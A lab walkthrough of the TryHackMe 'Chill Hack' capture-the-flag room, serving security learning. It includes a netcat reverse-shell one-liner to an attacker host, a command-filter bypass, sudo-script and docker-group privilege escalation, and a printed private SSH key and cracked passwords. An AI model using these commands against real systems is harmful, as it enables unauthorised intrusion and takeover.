# TryHackMe: Chill Hack Walkthrough:
	
Here we go again. Another day, another CTF. This one "Chill Hack", describes itself as an easy boot2root room. It has 2 objectives: obtain the User Flag, and obtain the Root Flag.

Let's get started!

## Phase 1: Enumeration

I always like to start with enumerating the access points in a machine. I get all that work done at the beginning, so then I have a "big-picture" view of the entire machine. In theory, that should allow me to see how everything connects as far as the penetration-testing process goes.

### NMap Scan:
	
I started off with an NMap scan. I used the following command:
	
```
sudo nmap -vv -sS -sC -sV 10.10.179.108
```

I found the following ports:
	
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

Another note of interest: FTP allows for anonymous login. I will be sure to check that out later.

### Directory Enumeration:
	
Next I started enumerating the directories with GoBuster. I used the following command:
	
```
gobuster -e -t 25 -u 10.10.179.108 -w dir_wordlist.txt -o gobuster_out -x .php,.txt,.js,.html -s 200,204,301,302,307
```

Returned the following:
	
```
http://10.10.179.108/about.html (Status: 200)
http://10.10.179.108/blog.html (Status: 200)
http://10.10.179.108/index.html (Status: 200)
http://10.10.179.108/images (Status: 301)
http://10.10.179.108/news.html (Status: 200)
http://10.10.179.108/contact.php (Status: 200)
http://10.10.179.108/contact.html (Status: 200)
http://10.10.179.108/css (Status: 301)
http://10.10.179.108/team.html (Status: 200)
http://10.10.179.108/js (Status: 301)
http://10.10.179.108/fonts (Status: 301)
http://10.10.179.108/secret (Status: 301)
```

Hmmm... **/secret** directory, that looks interesting! I'll be sure to check it out later.

That's it with enumeration, let's do some exploring!

## Phase 2: Exploration

Now that I have the site mapped out, I will now do a little bit of exploring.

### Anonymous FTP Login:
	
This was the first thing that caught my eye during the scans: The FTP service allows for an "Anonymous" login. So, I checked it out:
	
```
chillhack$ ftp 10.10.179.108
Connected to 10.10.179.108.
220 (vsFTPd 3.0.3)
Name (10.10.179.108:user): Anonymous 
331 Please specify the password.
Password: #No password was entered here
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

All right, I'm in the FTP server. Performed an **"ls -la"** command, and here's what I got:
	
```
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
```

There is a **"note.txt"** file. I performed a **"get"** command to move it to my PC:
	
```
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (278.1349 kB/s)
```

Went back to my PC, and opened the contents of **note.txt**:
	
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Interesting, I don't know what that is talking about. But I'm sure that it will make sense when I get further into the machine.

### Webpage Exploration:
	
I then checked out the website on my browser:
	
![Home Page](./screenshots/homepage.png)

I must say, as far as fake CTF webpages go, this is one of the best looking that I have seen! Props to the maker of this CTF!

Anyway, I did some exploring throughout the site. There are mostly dead-links, and very little functionality through the site.

Of course, the page I'm most interested in is this: the **"/secret/"** directory:
	
![Secret Page](./screenshots/secret.png)

This looks like a terminal input page. I tried typing in **"ls -ls"** to see what would come up, then this happened:
	
![Warning](./screenshots/warning.png)

Pretty funny, and frustrating.

I then typed **"whoami"**, and got:
	
![Command Success](./screenshots/cmdsuccess.png)

So, there are certain commands that I can and cannot run. I spent a while experimenting with different commands.

I found that while I could not run **ls**, I could run **/bin/ls**. So I could find files that way. In general, if I was usually not allowed to run a program, if type in it's full location, it would work: I.E. **cat file** would not work, but **/bin/cat file** would work.

So, now that I know how to bypass the filter on the command box, I can try for a reverse shell.

I first set up the listener on port 4444 of my attacking machine:
	
```
sudo nc -vnlp 4444
```

I then tried out a few reverse shell scripts from [HighOnCoffe](https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell), this is the one that worked for me:
	
#### Original Script:
```
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

#### Modified Script (To get past filters):
```
mkfifo /tmp/lol;<span style="color:red">/bin/</span>nc <span style="color:red">{THM_VPN_IP}</span> <span style="color:red">4444</span> 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

And now we have a shell!

```
Listening on 0.0.0.0 4444
Connection received on 10.10.252.149 45436
/bin/sh: 0: can't access tty; job control turned off
$
```

I'll be honest here, I looked and looked for the User Flag. I couldn't find it. So, to be sure that I wasn't missing anything, I ran the nuclear option:
	
I moved to the root directory and ran:
	
```
grep -irnw -P '\.{9}:.{32}\}' 2>/dev/null
```

I looked at the pattern of the User Flag in the room: It was a open-curly-brace({) followed by 9 characters, then a ":", followed by 32 characters.

At first, I tried to run the pattern as described, but I was still getting a bunch of matches. So I went with the assumption that the first 9 characters is probably "user(something)flag", so I listed the first section as "user(something)flag". This took a long time to run.

After a while scanning from the root directory, I decided that it was taking too long. I shut the scan down. I then tried the scan from the **/home** and **/var/www** directories, those did not find anything. I was satisfied that I could not find the user flag without getting user account control.

I moved to the **/home** directory, and ran **ls**:
	
```
anurodh
apaar
aurick
```

Looked into the **apaar** directory, and saw the following:
	
```
drwxr-xr-x 5 apaar apaar 4096 Oct  4 14:11 .
drwxr-xr-x 5 root  root  4096 Oct  3 04:28 ..
-rw------- 1 apaar apaar    0 Oct  4 14:14 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3 04:25 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3 04:25 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3 05:20 .cache
drwx------ 3 apaar apaar 4096 Oct  3 05:20 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4 14:11 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3 04:25 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3 05:19 .ssh
-rw------- 1 apaar apaar  817 Oct  3 04:27 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4 07:25 local.txt
```

I ran a **sudo -l** command to find out if there were any commands that I could run with elevated priveleges. I got:
	
```
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

It says that I can run the **/home/apaar/.helpline.sh** file as user **apaar** without a password. I pulled up the source code for the **.helpline.sh** file:
	
```shell
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

It looks like the **$msg** variable could be used to execute some code inside the program(as the user **apaar**). So I ran the **.helpline.sh** program as **apaar**:
	
```
$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

/bin/sh
/bin/sh

id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

I now have a shell as the user **apaar**! I looked into the file: **local.txt**

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

There is the user flag!

Now that I have the User Flag, I will now generate a new RSA Key Pair so that I will be able to login to apaar's account.

The first thing I do is run the following command in the reverse-shell (in the **/home/apaar** directory): 

```
ssh-keygen -f apaar
```

The above command will generate a public and private RSA key for Apaar's SSH login. It will then direct the output into 2 files: **apaar** (for the private key) and **apaar.pub** (for the public key).

I then took the **apaar.pub** file, and directed the contents into the **/home/apaar/.ssh/authorized_keys** file:
	
```
cat apaar.pub > ./.ssh/authorized_keys
```

I then typed **cat /home/apaar/apaar** and got:
	
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA6wKs6miYI2RnP5+fIKGs9AXe7EnQzc+bAO4jZsxWoDUeBm5F
j59hfxxEuVFHAiIQbXUT3ijhoeOQJcExECRdiukxXHIKHaGnUNawpAChkHpWPW0/
ZCZmulgSfi4n92dgNWkWXhJG/+DLx1pXfxA7hzkZ/uYgEukU43MOrK3Yq80HHkOw
f4RkCrXJmgFLKHyAnBEknN3KFmcaVdC+kBsHl1IN0MRjTNpCHnMVPCVSWDZceoUn
OWkpmdvv6xjfM046lFyKKOLg1PRlxSKybMUNx56vrizKxo9Lo4gBHL6NqGHtm2PA
DX679aGLAZUgB/DY3pfk4vULoDkLsXU8w9vDJQIDAQABAoIBAAzBT2tFlARPvb7Z
RgS6Ya2459mBRCD3hJ0vT6KTspvtZhzJPWNHLj585Un9nFIEUUnvkc18AIsN09QI
wUX0A1O3xmMTGXN0Q6WCkYHFOv+hdC7PUCJ6Zxb0EsTgcnDeHn2nn3wpl8rpg4Xl
ZFxUIDb9pWiNSu5b0jNqGkDLCriARKMvC9yAO55cSpDCaQGP2dx+smN07IRagr96
LjOV0Y0xNkcBCj/vJvozQ1i3bSXOQCmn8Zhde2rhbzPK9C8FH9Lwaz9jQHfuCVHL
o4sWfAYDW2SNYH3Y7S37PYsLRCb8oP2oegxge21fcO7G4OSAoimKSGMEc00UtWMr
ckbmIIECgYEA97OXbVAuYtdWdk5C6S+su/nHZ7w/DVj0YoeM9wf6w8p8mKWPBxSN
pkb98uEoi82fXPyfkbsyiUHdorLHwhB9RP4DUTqAx83kxK6t/DTimA70X6VbikfR
3ofIBjb3z+FzyCUkIASz7iV/ugK9TfGkkKO7iD5+Wge6whoqkmD9jaECgYEA8uI9
NVO/EspyCwiYwkVTqPjmkgs0S125mhUpPs3dQA6PZXau1CAEI/wlNRG8zaZXhabp
mKMzZz6rmeyqEkUyM/s76rZ/eOErCDviOhah0nSyj2AQAd1HiUFur/SdtC/Oslwp
VdfQXBwSGtJg8uDbmZ3J3uNOS5MqshnuORRRnwUCgYEA2cRxP7B7Z3hr0kzRtJKu
aQCa189/G2v2Rt1nCBNi2lkdm1IKYa4nLmVBhBOBgw9+qNCMNSH/tv5KLWzCBBJd
H5e2MOafK4oPMv9jhNS11ftnyuLkjLjBgMOdDiGrUn6iPPayQNgBnEApf85CwdDM
3kCkcY6HpP0gqt84SEKvB6ECgYEAo7vIL27pXC2Fe9KryCscHsjMBp/u/O+N80VY
rLHy+P/Xwzqi2PVMVUXhf0kZ0jjUv5Cp4PAD8xHYdMeKTw6+rTQsTCoC/OYuMDrO
YwJmzI1G4kiMAfW+B9VIXO22coXX/X0LkIcQO0fhHJu+J31WDNTGBa+OVHw9SBsa
8Pe1nlECgYEAvG2HWosv4bIIy4bxMgHEHqYLVXr0FaNQcuHLXL19CcLAq8qoNL3g
OunRjWEumhuUPSePVv8tPEtbi9rmd/YaA1RgVo/2EXtWRAQbrTNjSMehHUELzxqx
G/6nL6s71y+DA/hcWrfZjII3MLKKdf15zS7+2bmidx+k0w7W4mnC9dQ=
-----END RSA PRIVATE KEY-----
```

I copied this output onto my clipboard, then I pasted onto a file on my **local machine** called **"apaar.txt"**

I then set the proper permissions on the **apaar.txt** file on my local machine:
	
```
chmod 400 apaar.txt
```

Now I will be able to login to the apaar account through SSH without a password:
	
```
ssh -i apaar.txt apaar@{MACHINE_IP}
```

Now I am logged into Apaar's account with a true shell!

I made a copy of **"linpeas.sh"** and pasted it the source code of LinPEAS into it. (You can get the source code for LinPEAS [here.](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS))

I then ran LinPEAS on the victim machine.

After the LinPEAS scan was done, it pointed out an interesting file:
	
```
[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
/etc/popularity-contest.conf:"efa27e65ff884bc39ec713361e4fb52e"
/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
/etc/machine-id:798fcd76739440de8c586719da062c3f
/var/www/files/hacker.php:/002d7e638fb463fb7a266f5ffc7ac47d.
```

Anytime I see a file with "hacker" in the name on a CTF, I take notice. I looked at the source code with the "cat" command:
	
```html
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

I noticed that there are 2 images in this source code. Pairing that with the cryptic message: "Look in the dark! You will find your answer", I figured that there was steganography involved. 
	
I SCP'd the image files to my local machine by running the following command on my local machine:
	
```
scp -i apaar -r apaar@{MACHINE_IP}:/var/www/files/images/ ./
```

I then took the files and ran a tool called "StegSeek" (Link: [Here](https://github.com/RickdeJager/stegseek))(I also used the "rockyou.txt" password list)	

```
stegseek hacker-with-laptop_23-2147985341.jpg rockyou.txt 
```

It returned the following:
	
```
StegSeek version 0.5
Progress: 0.01% (16377 bytes)           

[i] --> Found passphrase: ""
[i] Original filename: "backup.zip"
[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out"
```

I attempted to unzip the file, but it required a password. I then broke out John The Ripper:
	
First used Zip2John:
	
```
...john/run/zip2john hacker-with-laptop_23-2147985341.jpg.out > ziphash
```

Then ran John on the hash file:
	
```
john -w=rockyou.txt ziphash
```

And got this:
	
```
pass1word        (hacker-with-laptop_23-2147985341.jpg.out/source_code.php)
```

Using the password, I then extracted a file called **"source_code.php"** 

I looked at the contents:
	
```html
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```

There is a reference to the user "Anurodh", and a password whose base64 encoding is: **IWQwbnRLbjB3bVlwQHNzdzByZA==**. 

I decoded the above:
	
```
echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d

!d0ntKn0wmYp@ssw0rd
```

I tried to SSH into Anurodh's account using the above credentials. It worked! I am now user Anurodh!

I checked to see what group I was in using the **id** command:
	
```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

Interesting, I am in the "docker" group. I looked up a docker exploit on [GTFGBins](https://gtfobins.github.io/gtfobins/docker/#shell):
	
I found this one:
	
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sha
```

Now after running the above command, I am now root!
	
I looked in the **/root** directory, and found this:
	
```
proof.txt
```

Looked at the contents:
	
```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

And that is the root flag! Thank you very much, I hope you found this helpful!
